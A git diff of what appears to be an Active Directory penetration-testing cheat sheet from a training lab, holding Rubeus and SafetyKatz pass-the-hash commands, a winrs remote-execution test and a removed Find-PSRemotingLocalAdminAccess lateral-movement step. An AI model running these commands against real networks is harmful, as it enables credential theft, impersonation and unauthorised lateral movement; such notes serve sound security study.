@@ -14,15 +14,11 @@ Rubeus.exe asktgt /user:<USER> /aes256:<HASH> /opsec /createnetonly:C:\Windows\S
 ```
 Use winrs to test
 ```powershell
-winrs -r:dcorp-dc whoami
+winrs -r:<HOST> whoami
 ```
 *Using SafetyKatz*
 ```powershell
 .\SafetyKatz.exe "sekurlsa::pth /user:<USER> /domain:<DOMAIN> /aes256:<HASH> /run:cmd.exe" "exit"
-```
-Run invishell and look for other system access
-```powershell
-Find-PSRemotingLocalAdminAccess -Verbose
 ```
 
 ### **Other Sessions Opened**
